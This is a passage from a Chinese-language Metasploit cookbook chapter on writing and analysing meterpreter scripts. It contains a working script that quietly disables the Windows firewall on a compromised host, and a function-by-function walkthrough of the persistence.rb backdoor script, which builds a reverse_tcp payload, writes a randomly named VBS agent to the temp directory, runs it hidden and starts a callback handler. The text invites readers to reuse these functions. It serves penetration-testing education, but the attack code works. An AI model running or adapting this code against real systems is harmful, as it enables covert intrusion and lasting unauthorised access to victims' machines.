1.  执行此脚本，我们将需要一个 meterpreter 会话。可以使用`run`命令来执行 Ruby 脚本。但是，在使用脚本之前，请确保您在目标机器上拥有系统特权。

```
meterpreter > getsystem
...got system (via technique 4).
meterpreter > run myscript.rb
[*] disabling the default firewall
meterpreter > 
```

成功执行脚本将悄悄地禁用默认防火墙。命令的执行发生在后台，因此目标用户对此毫不知情。现在让我们详细了解脚本。

## 它是如何工作的...

让我们分析脚本的每个部分。

```
opts = Rex::Parser::Arguments.new(
"-h" => [ false, "Help menu." ]
)
opts.parse(args) { |opt, idx, val|
case opt
when "-h"
print_line "Meterpreter Script for disabling the Default Windows Firewall"
print_line "Let's hope it works"
print_line(opts.usage)
raise Rex::Script::Completed
end
} 
```

这些代码行只是我们可以与脚本一起传递的选项。在此脚本中，我们可以使用的唯一选项是`-h`参数，它显示脚本的使用消息。您可以将此代码片段保存为创建脚本选项的模板。您将遇到几个代码片段，可以直接在您自己的脚本中使用。

脚本从创建一个哈希（opts）开始，其中包括 Rex 库，Rex 库是 Ruby 扩展库的简写。唯一的键是`-h`。使用值设置为'false'，这意味着这是脚本的可选参数。代码的下几行将提供的选项与脚本匹配，并跳转到特定情况以使用`print_line()`显示消息。在我们的情况下，我们只使用了一个选项（`-h`）。

```
unsupported if client.platform !~ /win32|win64/i
begin
print_status("disabling the default firewall")
cmd_exec('cmd /c','netsh advfirewall set AllProfiles state off',5)
end 
```

脚本的这部分是操作特定的。它从验证客户端操作系统开始。然后使用 meterpreter mixin `cmd_exec()`，它可以作为隐藏和通道化执行命令。要执行的命令是`netsh advfirewall set AllProfiles state off`。mixin 在客户端机器上调用此命令，与命令提示符一起成功执行，禁用了 Windows 防火墙。

您可以通过添加更多功能并尝试不同的可能性来玩弄脚本。您实验得越多，学到的就越多。

这是如何构建 meterpreter 脚本的简短演示。在下一个配方中，我们将详细了解高级 meterpreter 脚本。

## 还有更多...

让我们扩展我们的讨论，以便更快更有效地进行渗透测试。

### 代码重用

代码重用可以是构建自己脚本的有效技术。您可以找到一些现成的函数，例如创建多处理程序、设置参数检查、添加有效载荷。您可以直接在您的代码中使用它们并利用其功能。请记住，学习 meterpreter 脚本的最佳方法是查看内置脚本。

# 分析现有的 meterpreter 脚本

现在我们已经学会了如何构建自己的脚本，让我们继续分析执行一些高级任务的现有脚本。一旦您能完全阅读现有脚本，您就可以根据需要从中实现函数。代码重用是增加代码优化的有效技术。

## 如何做到这一点...

要查看现有脚本，请浏览到`pentest/exploits/framework3/scripts/meterpreter`。

您可以在此文件夹中找到所有可用的 meterpreter 脚本。我们将分析`persistence.rb`脚本，该脚本有助于在目标用户上设置后门。我们在上一章中已经讨论了此脚本的用法。在这里，我们将深入了解此脚本的功能。

## 它是如何工作的...

让我们逐一分析代码的每个部分。

```
# Default parameters for payload
rhost = Rex::Socket.source_address("1.2.3.4")
rport = 4444
delay = 5
install = false
autoconn = false
serv = false
altexe = nil
target_dir = nil
payload_type = "windows/meterpreter/reverse_tcp"
script = nil
script_on_target = nil 
```

代码从声明在脚本中使用的变量开始。您可以看到一些常见变量，例如`rhost、rport、payload_type`，我们在整个利用过程中一直在使用。

```
@exec_opts = Rex::Parser::Arguments.new(
"-h" => [ false, "This help menu"],
"-r" => [ true, "The IP of the system running Metasploit listening for the connect back"],
"-p" => [ true, "The port on the remote host where Metasploit is listening"],
"-i" => [ true, "The interval in seconds between each connection attempt"],
"-i" => [ true, "The interval in seconds between each connection attempt"],
"-X" => [ false, "Automatically start the agent when the system boots"],
"-U" => [ false, "Automatically start the agent when the User logs on"],
"-S" => [ false, "Automatically start the agent on boot as a service (with SYSTEM privileges)"],
"-A" => [ false, "Automatically start a matching multi/handler to connect to the agent"],
"-L" => [ true, "Location in target host where to write payload to, if none \%TEMP\% will be used."],
"-T" => [ true, "Alternate executable template to use"],
"-P" => [ true, "Payload to use, default is windows/meterpreter/reverse_tcp."]
)
meter_type = client.platform 
```

脚本的下一部分包括必须与脚本一起传递的不同参数（标志）。具有`true`值的参数是必须的标志，其值必须由渗透测试人员传递。具有`false`值的参数是可选的。

```
# Usage Message Function
#-------------------------------------------------------------------------------
def usage
print_line "Meterpreter Script for creating a persistent backdoor on a target host."
print_line(@exec_opts.usage)
raise Rex::Script::Completed
end
# Wrong Meterpreter Version Message Function
#-------------------------------------------------------------------------------
def wrong_meter_version(meter = meter_type)
print_error("#{meter} version of Meterpreter is not supported with this Script!")
raise Rex::Script::Completed
end 
```

脚本的下一部分包括函数声明。前两个函数通常在所有 meterpreter 脚本中都可用。使用函数用于显示脚本的介绍性消息。它包含有关脚本用途的简短描述。`wrong_meter_version()`用于验证脚本是否支持 meterpreter 版本。一些脚本不支持较旧的 meterpreter 版本，因此验证可能会有所帮助。

```
# Function for Creating the Payload
#-------------------------------------------------------------------------------
def create_payload(payload_type,lhost,lport)
print_status("Creating Payload=#{payload_type} LHOST=#{lhost} LPORT=#{lport}")
payload = payload_type
pay = client.framework.payloads.create(payload)
pay.datastore['LHOST'] = lhost
pay.datastore['LPORT'] = lport
return pay.generate
end 
```

下一个函数是用于创建有效载荷的。如果您想创建有效载荷（代码重用的力量），则可以直接在您的脚本中使用此函数。函数`create_payload()`接受两个值，即`payload_type`和`lport`。如果您记得变量声明部分，那么这两个变量已经初始化为一些默认值。

`pay = client.framework.payloads.create(payload)`调用允许我们从 Metasploit 框架中创建有效载荷。

在此片段中需要注意的一件事是`pay.datastore['LHOST'] = lhost`和`pay.datastore['LPORT'] = lport`。数据存储区只是一组值的哈希，可能被模块或框架本身用来引用程序员或用户控制的值。

```
# Function for Creating persistent script
#-------------------------------------------------------------------------------
def create_script(delay,altexe,raw)
if altexe
vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw, {:persist => true, :delay => delay, :template => altexe})
else
vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw, {:persist => true, :delay => delay})
end
print_status("Persistent agent script is #{vbs.length} bytes long")
return vbs
end 
```

下一个函数是用于创建持久脚本的。脚本是根据传递给脚本的有效载荷和其他参数值创建的。

```
# Function for creating log folder and returning log path
#-------------------------------------------------------------------------------
def log_file(log_path = nil)
#Get hostname
host = @client.sys.config.sysinfo["Computer"]
# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
# Create a directory for the logs
if log_path
logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
else
logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
end
# Create the log directory
::FileUtils.mkdir_p(logs)
#logfile name
logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
return logfile
end 
```

下一个函数是用于为脚本创建日志目录的。`host = @client.sys.config.sysinfo["Computer"]`调用提取了受损目标的系统信息。使用负责执行文件和目录操作的 Rex::FileUtils 库创建了目录和文件名。

```
# Function for writing script to target host
#-------------------------------------------------------------------------------
def write_script_to_target(target_dir,vbs)
if target_dir
tempdir = target_dir
else
tempdir = @client.fs.file.expand_path("%TEMP%")
end
tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
fd = @client.fs.file.new(tempvbs, "wb")
fd.write(vbs)
fd.close
print_good("Persistent Script written to #{tempvbs}")
file_local_write(@clean_up_rc, "rm #{tempvbs}\n")
return tempvbs
end 
```

该函数开始将文件写入磁盘。它将各种后门文件保存在之前函数创建的文件夹和目录中。`Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"`调用生成一个随机文本作为要在临时目录中创建的文件名。`fd.write()`调用将文件写入磁盘。

```
# Function for setting multi handler for autocon
#-------------------------------------------------------------------------------
def set_handler(selected_payload,rhost,rport)
print_status("Starting connection handler at port #{rport} for #{selected_payload}")
mul = client.framework.exploits.create("multi/handler")
mul.datastore['WORKSPACE'] = @client.workspace
mul.datastore['PAYLOAD'] = selected_payload
mul.datastore['LHOST'] = rhost
mul.datastore['LPORT'] = rport
mul.datastore['EXITFUNC'] = 'process'
mul.datastore['ExitOnSession'] = false
mul.exploit_simple(
'Payload' => mul.datastore['PAYLOAD'],
'RunAsJob' => true
)
print_good("Multi/Handler started!")
end 
```

该函数创建一个多处理程序，以连接回攻击系统。这是一个通用函数，如果您想通过设置多处理程序来实现自动连接功能，可以在您的脚本中使用它。

```
# Function to execute script on target and return the PID of the process
#-------------------------------------------------------------------------------
def targets_exec(script_on_target)
print_status("Executing script #{script_on_target}")
proc = session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})
print_good("Agent executed with PID #{proc.pid}")
file_local_write(@clean_up_rc, "kill #{proc.pid}\n")
return proc.pid
end 
```

该函数负责在目标机器上执行脚本。持久性脚本在目标机器上创建 vbs 脚本，因此必须执行它们以打开连接。`Targets_exec()`函数解决了这个目的。如果您想在目标机器上执行脚本，这个函数可以再次作为通用函数在您自己的脚本中使用。`session.sys.process.execute()`调用负责执行脚本，`proc.pid`返回创建的后门进程的进程 ID。

代码的其余部分是不言自明的，这些函数被调用，一个清晰的脚本被创建，并且一个选项检查被实施。这个示例可能让您清楚地了解当我们执行一个 meterpreter 脚本时背后发生了什么。从渗透测试人员的角度来看，能够根据工作场景阅读和修改代码非常重要。这就是开源框架的美妙之处所在。您可以根据自己的需求进行修改，并通过直接分析现有的源代码来学习。
